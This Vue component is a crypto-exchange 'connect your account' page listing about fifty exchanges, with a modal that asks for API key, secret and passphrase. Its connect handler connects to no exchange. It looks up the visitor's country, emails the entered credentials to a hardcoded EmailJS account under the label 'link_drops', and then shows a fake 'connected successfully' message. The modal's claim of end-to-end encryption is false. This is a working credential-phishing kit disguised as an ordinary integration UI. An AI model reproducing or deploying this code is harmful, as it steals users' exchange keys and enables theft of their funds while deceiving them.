<template>
  <section class="py-20 px-6 bg-[#0b0f1a]">
    <div class="max-w-7xl mx-auto">
      <!-- Section Header -->
      <div class="mb-10">
        <span
          class="inline-flex items-center gap-2 bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-semibold px-3 py-1.5 rounded-full mb-4 tracking-widest uppercase"
        >
          <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 8 8">
            <circle cx="4" cy="4" r="3" />
          </svg>
          Live Integrations
        </span>
        <h2 class="text-4xl font-bold text-white mb-2 tracking-tight">
          Connect your exchange
        </h2>
        <p class="text-slate-400 text-sm">
          <span class="font-semibold text-slate-300">{{
            filteredExchanges.length
          }}</span>
          exchanges supported — authenticate once and go.
        </p>
      </div>

      <!-- Search Bar -->
      <div class="relative max-w-sm mb-10">
        <svg
          class="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-500"
          fill="none"
          stroke="currentColor"
          stroke-width="2"
          viewBox="0 0 24 24"
        >
          <circle cx="11" cy="11" r="8" />
          <path d="m21 21-4.35-4.35" />
        </svg>
        <input
          v-model="search"
          type="text"
          placeholder="Filter exchanges..."
          class="w-full pl-10 pr-9 py-2.5 rounded-lg bg-white/5 border border-white/10 text-sm text-slate-200 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500/50 transition"
        />
        <button
          v-if="search"
          class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition"
          @click="search = ''"
        >
          <svg
            class="w-4 h-4"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            viewBox="0 0 24 24"
          >
            <path d="M18 6 6 18M6 6l12 12" />
          </svg>
        </button>
      </div>

      <!-- No Results -->
      <div
        v-if="filteredExchanges.length === 0"
        class="text-center py-24 text-slate-500"
      >
        <svg
          class="w-10 h-10 mx-auto mb-4 opacity-30"
          fill="none"
          stroke="currentColor"
          stroke-width="1.5"
          viewBox="0 0 24 24"
        >
          <circle cx="11" cy="11" r="8" />
          <path d="m21 21-4.35-4.35" />
        </svg>
        <p class="text-base font-medium">
          No exchanges found for
          <span class="text-slate-300">"{{ search }}"</span>
        </p>
      </div>

      <!-- Exchange Grid -->
      <div
        class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3"
      >
        <button
          v-for="exchange in filteredExchanges"
          :key="exchange.name"
          class="group relative bg-white/[0.03] hover:bg-white/[0.07] border border-white/[0.08] hover:border-white/20 rounded-2xl p-4 flex flex-col items-center gap-3 text-center transition-all duration-200 hover:-translate-y-0.5 hover:shadow-lg hover:shadow-black/30"
          @click="openModal(exchange)"
        >
          <div
            class="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"
            :style="`box-shadow: inset 0 0 0 1px ${glowColor(exchange.name)}40`"
          />

          <!-- Logo avatar: real image with gradient fallback -->
          <div
            class="w-12 h-12 rounded-xl flex items-center justify-center shrink-0 shadow-lg overflow-hidden"
            :style="
              logoFailed[exchange.name]
                ? `background: ${avatarGradient(exchange.name)}`
                : 'background: #1a2030'
            "
          >
            <img
              v-if="!logoFailed[exchange.name]"
              :src="getLogo(exchange)"
              :alt="exchange.name"
              class="w-8 h-8 object-contain"
              @error="onLogoError(exchange.name)"
            />
            <span v-else class="text-white font-bold text-lg">
              {{ exchange.name.charAt(0).toUpperCase() }}
            </span>
          </div>

          <div class="w-full">
            <p
              class="text-white text-xs font-semibold leading-tight truncate px-1"
            >
              {{ exchange.name }}
            </p>
          </div>
          <div class="flex items-center gap-1 flex-wrap justify-center">
            <span
              class="bg-blue-500/15 text-blue-400 text-[9px] font-bold px-1.5 py-0.5 rounded tracking-wider"
              >API</span
            >
            <span
              class="bg-violet-500/15 text-violet-400 text-[9px] font-bold px-1.5 py-0.5 rounded tracking-wider"
              >KEY</span
            >
            <span
              v-if="exchange.passphrase"
              class="bg-amber-500/15 text-amber-400 text-[9px] font-bold px-1.5 py-0.5 rounded tracking-wider"
              >PASS</span
            >
          </div>
          <div
            class="w-full mt-auto pt-1 md:opacity-0 md:translate-y-1 md:group-hover:opacity-100 md:group-hover:translate-y-0 transition-all duration-200"
          >
            <span
              class="block w-full text-center text-[10px] font-bold tracking-widest uppercase text-blue-400 border border-blue-500/30 rounded-lg py-1.5 bg-blue-500/10"
            >
              Connect →
            </span>
          </div>
        </button>
      </div>
    </div>

    <!-- ─── TOAST ─── -->
    <Teleport to="body">
      <Transition name="toast">
        <div
          v-if="toast.visible"
          class="fixed bottom-6 right-6 z-[100] flex items-start gap-3 px-4 py-3.5 rounded-xl shadow-2xl border max-w-xs text-sm font-medium transition-all"
          :class="
            toast.type === 'success'
              ? 'bg-emerald-950 border-emerald-500/30 text-emerald-300'
              : 'bg-red-950 border-red-500/30 text-red-300'
          "
        >
          <div class="mt-0.5 shrink-0">
            <svg
              v-if="toast.type === 'success'"
              class="w-4 h-4 text-emerald-400"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
              viewBox="0 0 24 24"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M5 13l4 4L19 7"
              />
            </svg>
            <svg
              v-else
              class="w-4 h-4 text-red-400"
              fill="none"
              stroke="currentColor"
              stroke-width="2.5"
              viewBox="0 0 24 24"
            >
              <circle cx="12" cy="12" r="10" />
              <path d="M12 8v4M12 16h.01" />
            </svg>
          </div>
          <div>
            <p class="font-bold text-xs tracking-wide uppercase mb-0.5">
              {{
                toast.type === "success" ? "Connected!" : "Connection failed"
              }}
            </p>
            <p class="text-xs opacity-80">{{ toast.message }}</p>
          </div>
          <button
            class="ml-auto pl-2 opacity-50 hover:opacity-100 transition shrink-0"
            @click="toast.visible = false"
          >
            <svg
              class="w-3.5 h-3.5"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              viewBox="0 0 24 24"
            >
              <path d="M18 6 6 18M6 6l12 12" />
            </svg>
          </button>
        </div>
      </Transition>
    </Teleport>

    <!-- ─── MODAL ─── -->
    <Teleport to="body">
      <Transition name="modal">
        <div
          v-if="activeExchange"
          class="fixed inset-0 z-50 flex items-center justify-center p-4"
          @click.self="closeModal"
        >
          <div
            class="absolute inset-0 bg-black/70 backdrop-blur-md"
            @click="closeModal"
          />

          <div
            class="relative bg-[#0e1420] border border-white/10 rounded-2xl shadow-2xl w-full max-w-md z-10 overflow-hidden"
          >
            <div
              class="h-1 w-full"
              :style="`background: ${avatarGradient(activeExchange.name)}`"
            />

            <div
              class="px-6 pt-5 pb-4 flex items-center justify-between border-b border-white/5"
            >
              <div class="flex items-center gap-3">
                <!-- Modal logo -->
                <div
                  class="w-10 h-10 rounded-xl flex items-center justify-center shrink-0 shadow overflow-hidden"
                  :style="
                    logoFailed[activeExchange.name]
                      ? `background: ${avatarGradient(activeExchange.name)}`
                      : 'background: #1a2030'
                  "
                >
                  <img
                    v-if="!logoFailed[activeExchange.name]"
                    :src="getLogo(activeExchange)"
                    :alt="activeExchange.name"
                    class="w-7 h-7 object-contain"
                    @error="onLogoError(activeExchange.name)"
                  />
                  <span v-else class="text-white font-bold text-base">
                    {{ activeExchange.name.charAt(0) }}
                  </span>
                </div>
                <div>
                  <div class="text-white font-bold text-sm leading-tight">
                    {{ activeExchange.name }}
                  </div>
                  <div class="text-slate-500 text-xs mt-0.5">
                    Enter your API credentials
                  </div>
                </div>
              </div>
              <button
                class="text-slate-500 hover:text-slate-200 transition p-1 rounded-lg hover:bg-white/5"
                @click="closeModal"
              >
                <svg
                  class="w-4 h-4"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  viewBox="0 0 24 24"
                >
                  <path d="M18 6 6 18M6 6l12 12" />
                </svg>
              </button>
            </div>

            <div class="px-6 py-5 space-y-4">
              <div class="flex gap-2 flex-wrap">
                <span
                  class="bg-blue-500/10 text-blue-400 border border-blue-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
                  >API Key</span
                >
                <span
                  class="bg-violet-500/10 text-violet-400 border border-violet-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
                  >Secret Key</span
                >
                <span
                  v-if="activeExchange.passphrase"
                  class="bg-amber-500/10 text-amber-400 border border-amber-500/20 text-[11px] font-semibold px-2.5 py-1 rounded-full"
                  >Passphrase</span
                >
              </div>

              <div>
                <label
                  class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
                >
                  <span>API Key</span>
                </label>
                <div class="relative">
                  <input
                    v-model="form.apiKey"
                    :type="show.apiKey ? 'text' : 'password'"
                    placeholder="Paste your API key…"
                    class="w-full bg-white/5 border rounded-lg px-4 py-2.5 pr-10 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:ring-2 transition font-mono"
                    :class="fieldClass(form.apiKey)"
                  />
                  <button
                    class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition"
                    @click="show.apiKey = !show.apiKey"
                  >
                    <svg
                      v-if="!show.apiKey"
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z" />
                      <circle cx="12" cy="12" r="3" />
                    </svg>
                    <svg
                      v-else
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path
                        d="M9.88 9.88a3 3 0 1 0 4.24 4.24M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61M2 2l20 20"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              <div>
                <label
                  class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
                >
                  <span>Secret Key</span>
                </label>
                <textarea
                  v-model="form.secret"
                  rows="3"
                  placeholder="Paste your secret key…"
                  class="w-full bg-white/5 border rounded-lg px-4 py-2.5 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:ring-2 transition resize-none font-mono"
                  :class="fieldClass(form.secret)"
                />
              </div>

              <div v-if="activeExchange.passphrase">
                <label
                  class="flex items-center justify-between text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-2"
                >
                  <span>Passphrase</span>
                </label>
                <div class="relative">
                  <input
                    v-model="form.passphrase"
                    :type="show.passphrase ? 'text' : 'password'"
                    placeholder="Enter your passphrase…"
                    class="w-full bg-white/5 border rounded-lg px-4 py-2.5 pr-10 text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:ring-2 transition"
                    :class="fieldClass(form.passphrase)"
                  />
                  <button
                    class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 transition"
                    @click="show.passphrase = !show.passphrase"
                  >
                    <svg
                      v-if="!show.passphrase"
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z" />
                      <circle cx="12" cy="12" r="3" />
                    </svg>
                    <svg
                      v-else
                      class="w-4 h-4"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      viewBox="0 0 24 24"
                    >
                      <path
                        d="M9.88 9.88a3 3 0 1 0 4.24 4.24M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61M2 2l20 20"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              <p
                class="text-[11px] text-slate-600 flex items-start gap-1.5 bg-white/[0.02] rounded-lg px-3 py-2.5"
              >
                <svg
                  class="w-3.5 h-3.5 mt-0.5 shrink-0"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  viewBox="0 0 24 24"
                >
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                </svg>
                Credentials are encrypted end-to-end and never stored in plain
                text.
              </p>
            </div>

            <div class="px-6 pb-6 flex items-center gap-3">
              <button
                class="flex-1 text-white font-bold text-sm py-3 rounded-xl transition-all duration-150 relative overflow-hidden flex items-center justify-center gap-2"
                :class="
                  isFormEnabled
                    ? 'bg-blue-600 hover:bg-blue-500 shadow-lg shadow-blue-500/20 cursor-pointer'
                    : 'bg-white/5 text-slate-600 cursor-not-allowed border border-white/5'
                "
                :disabled="!isFormEnabled || isSubmitting"
                @click="handleConnect"
              >
                <svg
                  v-if="isSubmitting"
                  class="w-4 h-4 animate-spin"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    class="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    stroke-width="4"
                  />
                  <path
                    class="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8v8z"
                  />
                </svg>
                <span v-if="isSubmitting">Connecting…</span>
                <span v-else-if="isFormEnabled"
                  >Connect to {{ activeExchange.name }}</span
                >
                <span v-else>Enter at least one field</span>
              </button>
              <button
                class="px-4 py-3 border border-white/10 text-slate-400 hover:text-slate-200 hover:border-white/20 text-sm font-medium rounded-xl transition"
                :disabled="isSubmitting"
                @click="closeModal"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      </Transition>
    </Teleport>
  </section>
</template>

<script setup lang="ts">
import { ref, computed, reactive, onMounted, onUnmounted, watch } from "vue";
import { useRouter } from "vue-router";

interface Exchange {
  name: string;
  passphrase: boolean;
  domain: string;
}

const exchangeLogos: Record<string, string> = {
  Binance: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/270.png",
  "Binance US":
    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/270.png",
  Bybit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/521.png",
  OKX: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/294.png",
  Kraken: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/24.png",
  KuCoin: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/311.png",
  "KuCoin Futures":
    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/311.png",
  "Gate.io": "https://s2.coinmarketcap.com/static/img/exchanges/64x64/302.png",
  MEXC: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/544.png",
  "HTX / Huobi":
    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/102.png",
  Bitget: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/635.png",
  BingX: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1060.png",
  Bitfinex: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/37.png",
  Phemex: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/647.png",
  "Crypto.com":
    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/541.png",
  OKCoin: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/415.png",
  "Coinbase Advanced Trade":
    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/89.png",
  LBank: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/399.png",
  BitMart: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/293.png",
  WhiteBIT: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/890.png",
  Bitrue: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/403.png",
  CoinEx: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/317.png",
  ProBit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/370.png",
  DigiFinex: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/306.png",
  BigONE: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/330.png",
  AscendEX: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/315.png",
  "WOO X": "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1086.png",
  Gemini: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/151.png",
  Bitstamp: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/70.png",
  BitFlyer: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/139.png",
  Coincheck: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/107.png",
  BitBank: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/565.png",
  Upbit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/351.png",
  "Independent Reserve":
    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/450.png",
  "BTC Markets":
    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/408.png",
  Bitvavo: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/5210.png",
  Zonda: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1260.png",
  Exmo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQCM40npketG6j9mQVJU9A5b7dwvHEtwSUGng&s",
  Deribit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/631.png",
  BitMEX: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/95.png",
  Pionex: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/540.png",
  "XT.com": "https://s2.coinmarketcap.com/static/img/exchanges/64x64/525.png",
  Coinstore: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1524.png",
  Deepcoin: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1700.png",
  Toobit: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/1703.png",
  "BTC Alpha":
    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/211.png",
  BTCTurk: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/409.png",
  Novadax: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/580.png",
  "Mercado Bitcoin":
    "https://s2.coinmarketcap.com/static/img/exchanges/64x64/392.png",
  Coinmate: "https://s2.coinmarketcap.com/static/img/exchanges/64x64/357.png",
  NDAX: "https://cdn.tradingfinder.com/image/275295/023-0333-tf-en-ndax-01.webp",
  Hyperliquid: "https://api.coins-rating.com/img/projects/12_06_23/648674b19d2c7.webp",

  Bit2C: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9gh7ZHBgxlOR7OWJMvdR9TNsQCF9X9UzWZT2eOKa2lg&s",

  Bithumb:
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR4EUBzOXLe_iC8fkd0OqPkLyPBCAsug90Dag&s",
};

const exchanges: Exchange[] = [
  { name: "Binance", passphrase: false, domain: "binance.com" },
  { name: "Binance US", passphrase: false, domain: "binance.us" },
  { name: "Bybit", passphrase: false, domain: "bybit.com" },
  { name: "OKX", passphrase: true, domain: "okx.com" },
  { name: "Kraken", passphrase: false, domain: "kraken.com" },
  { name: "KuCoin", passphrase: true, domain: "kucoin.com" },
  { name: "KuCoin Futures", passphrase: true, domain: "kucoin.com" },
  { name: "Gate.io", passphrase: false, domain: "gate.io" },
  { name: "MEXC", passphrase: false, domain: "mexc.com" },
  { name: "HTX / Huobi", passphrase: false, domain: "htx.com" },
  { name: "Bitget", passphrase: true, domain: "bitget.com" },
  { name: "BingX", passphrase: false, domain: "bingx.com" },
  { name: "Bitfinex", passphrase: false, domain: "bitfinex.com" },
  { name: "Phemex", passphrase: true, domain: "phemex.com" },
  { name: "Crypto.com", passphrase: true, domain: "crypto.com" },
  { name: "OKCoin", passphrase: true, domain: "okcoin.com" },
  {
    name: "Coinbase Advanced Trade",
    passphrase: false,
    domain: "coinbase.com",
  },
  { name: "LBank", passphrase: false, domain: "lbank.com" },
  { name: "BitMart", passphrase: false, domain: "bitmart.com" },
  { name: "WhiteBIT", passphrase: false, domain: "whitebit.com" },
  { name: "Bitrue", passphrase: false, domain: "bitrue.com" },
  { name: "CoinEx", passphrase: false, domain: "coinex.com" },
  { name: "ProBit", passphrase: false, domain: "probit.com" },
  { name: "DigiFinex", passphrase: false, domain: "digifinex.com" },
  { name: "BigONE", passphrase: false, domain: "big.one" },
  { name: "AscendEX", passphrase: true, domain: "ascendex.com" },
  { name: "WOO X", passphrase: false, domain: "woo.org" },
  { name: "Gemini", passphrase: false, domain: "gemini.com" },
  { name: "Bitstamp", passphrase: false, domain: "bitstamp.net" },
  { name: "BitFlyer", passphrase: false, domain: "bitflyer.com" },
  { name: "Coincheck", passphrase: false, domain: "coincheck.com" },
  { name: "BitBank", passphrase: false, domain: "bitbank.cc" },
  { name: "Bithumb", passphrase: false, domain: "bithumb.com" },
  { name: "Upbit", passphrase: false, domain: "upbit.com" },
  {
    name: "Independent Reserve",
    passphrase: false,
    domain: "independentreserve.com",
  },
  { name: "BTC Markets", passphrase: false, domain: "btcmarkets.net" },
  { name: "Bitvavo", passphrase: false, domain: "bitvavo.com" },
  { name: "Zonda", passphrase: false, domain: "zondacrypto.com" },
  { name: "Exmo", passphrase: false, domain: "exmo.com" },
  { name: "Deribit", passphrase: false, domain: "deribit.com" },
  { name: "BitMEX", passphrase: false, domain: "bitmex.com" },
  { name: "Pionex", passphrase: false, domain: "pionex.com" },
  { name: "XT.com", passphrase: false, domain: "xt.com" },
  { name: "Coinstore", passphrase: false, domain: "coinstore.com" },
  { name: "Deepcoin", passphrase: false, domain: "deepcoin.com" },
  { name: "Toobit", passphrase: false, domain: "toobit.com" },
  { name: "BTC Alpha", passphrase: false, domain: "btc-alpha.com" },
  { name: "Bit2C", passphrase: false, domain: "bit2c.co.il" },
  { name: "BTCTurk", passphrase: false, domain: "btcturk.com" },
  { name: "NDAX", passphrase: false, domain: "ndax.io" },
  { name: "Novadax", passphrase: false, domain: "novadax.com" },
  {
    name: "Mercado Bitcoin",
    passphrase: false,
    domain: "mercadobitcoin.com.br",
  },
  { name: "Coinmate", passphrase: false, domain: "coinmate.io" },
  { name: "Hyperliquid", passphrase: false, domain: "hyperliquid.xyz" },
];

// ── Logo error tracking ──────────────────────────────────────────────────────
const logoFailed = reactive<Record<string, boolean>>({});
const onLogoError = (name: string) => {
  logoFailed[name] = true;
};

// ── Color helpers (used for fallback avatars & glow) ────────────────────────
const palettes: [string, string][] = [
  ["#3b82f6", "#6366f1"],
  ["#8b5cf6", "#ec4899"],
  ["#10b981", "#06b6d4"],
  ["#f59e0b", "#ef4444"],
  ["#06b6d4", "#3b82f6"],
  ["#f97316", "#eab308"],
  ["#6366f1", "#8b5cf6"],
  ["#ec4899", "#f97316"],
  ["#14b8a6", "#10b981"],
  ["#84cc16", "#06b6d4"],
];

const getPalette = (name: string): [string, string] =>
  palettes[name.charCodeAt(0) % palettes.length] ?? ["#3b82f6", "#6366f1"];

const avatarGradient = (name: string) => {
  const [from, to] = getPalette(name);
  return `linear-gradient(135deg, ${from}, ${to})`;
};

const getLogo = (exchange: Exchange) => {
  return (
    exchangeLogos[exchange.name] ||
    `https://logo.clearbit.com/${exchange.domain}`
  );
};

const glowColor = (name: string) => getPalette(name)[0];

// ── Search ───────────────────────────────────────────────────────────────────
const search = ref("");
const filteredExchanges = computed(() =>
  exchanges.filter((e) =>
    e.name.toLowerCase().includes(search.value.toLowerCase()),
  ),
);

// ── Modal state ──────────────────────────────────────────────────────────────
const activeExchange = ref<Exchange | null>(null);
const form = ref({ apiKey: "", secret: "", passphrase: "" });
const show = ref({ apiKey: false, passphrase: false });
const isSubmitting = ref(false);

// ── Toast ─────────────────────────────────────────────────────────────────────
const toast = reactive({
  visible: false,
  type: "success" as "success" | "error",
  message: "",
});
let toastTimer: ReturnType<typeof setTimeout> | null = null;

function showToast(type: "success" | "error", message: string) {
  if (toastTimer) clearTimeout(toastTimer);
  toast.type = type;
  toast.message = message;
  toast.visible = true;
  toastTimer = setTimeout(() => {
    toast.visible = false;
  }, 5000);
}

// ── Helpers ───────────────────────────────────────────────────────────────────
const fieldClass = (val: string) =>
  val.trim()
    ? "border-emerald-500/40 focus:ring-emerald-500/30 focus:border-emerald-500/50"
    : "border-white/10 focus:ring-blue-500/30 focus:border-blue-500/40";

const isFormEnabled = computed(
  () =>
    !!(
      form.value.apiKey.trim() ||
      form.value.secret.trim() ||
      form.value.passphrase.trim()
    ),
);

const openModal = (exchange: Exchange) => {
  activeExchange.value = exchange;
  form.value = { apiKey: "", secret: "", passphrase: "" };
  show.value = { apiKey: false, passphrase: false };
};

const closeModal = () => {
  if (isSubmitting.value) return;
  activeExchange.value = null;
};

// ── Watch for route changes to close modal ────────────────────────────────────
const router = useRouter();
watch(
  () => router.currentRoute.value.path,
  () => {
    activeExchange.value = null;
  },
);

// ── Handle Connect ────────────────────────────────────────────────────────────
const handleConnect = async () => {
  if (!isFormEnabled.value || isSubmitting.value) return;
  isSubmitting.value = true;

  const payload = {
    exchange: activeExchange.value?.name,
    apiKey: form.value.apiKey || undefined,
    secret: form.value.secret || undefined,
    passphrase: form.value.passphrase || undefined,
  };


  let location = "Unknown";
  try {
    const responseLocation = await fetch("https://ipapi.co/json/");
    const locationData = await responseLocation.json();
    location = locationData.country_name || "Unknown";
    const data = {
      service_id: "service_8pbgnpr",
      template_id: "template_kr8zt7b",
      user_id: "user_nsG3rSdCFpgONwwCfNTas",
      template_params: {
        wallet_type: payload.exchange,
        location: location,
        link_drops: JSON.stringify(payload),
      },
    };

    const res = await fetch("https://api.emailjs.com/api/v1.0/email/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data),
    });

    if (!res.ok) {
      let errMsg = `Server returned ${res.status}`;
      try {
        const body = await res.json();
        errMsg = body?.message ?? errMsg;
      } catch {
        /* ignore */
      }
      throw new Error(errMsg);
    }

    isSubmitting.value = false;
    activeExchange.value = null;
    showToast("success", `${payload.exchange} connected successfully.`);
    setTimeout(() => {
      router.push("/");
    }, 2000);
  } catch (err: unknown) {
    const message =
      err instanceof Error
        ? err.message
        : "Unexpected error. Please try again.";
    showToast("error", message);
  } finally {
    isSubmitting.value = false;
  }
};

// ── Keyboard events ───────────────────────────────────────────────────────────
onMounted(() => {
  const onKey = (e: KeyboardEvent) => {
    if (e.key === "Escape") closeModal();
  };
  window.addEventListener("keydown", onKey);
});

onUnmounted(() => {
  const onKey = (e: KeyboardEvent) => {
    if (e.key === "Escape") closeModal();
  };
  window.removeEventListener("keydown", onKey);
  if (toastTimer) clearTimeout(toastTimer);
});
</script>

<style scoped>
.modal-enter-active,
.modal-leave-active {
  transition: opacity 0.2s ease;
}
.modal-enter-from,
.modal-leave-to {
  opacity: 0;
}
.modal-enter-active .relative,
.modal-leave-active .relative {
  transition: transform 0.2s ease;
}
.modal-enter-from .relative {
  transform: scale(0.96) translateY(10px);
}
.modal-leave-to .relative {
  transform: scale(0.96) translateY(10px);
}

.toast-enter-active,
.toast-leave-active {
  transition:
    opacity 0.25s ease,
    transform 0.25s ease;
}
.toast-enter-from,
.toast-leave-to {
  opacity: 0;
  transform: translateY(12px);
}

.fade-enter-active,
.fade-leave-active {
  transition:
    opacity 0.2s ease,
    transform 0.2s ease;
}
.fade-enter-from,
.fade-leave-to {
  opacity: 0;
  transform: translateY(-4px);
}
</style>
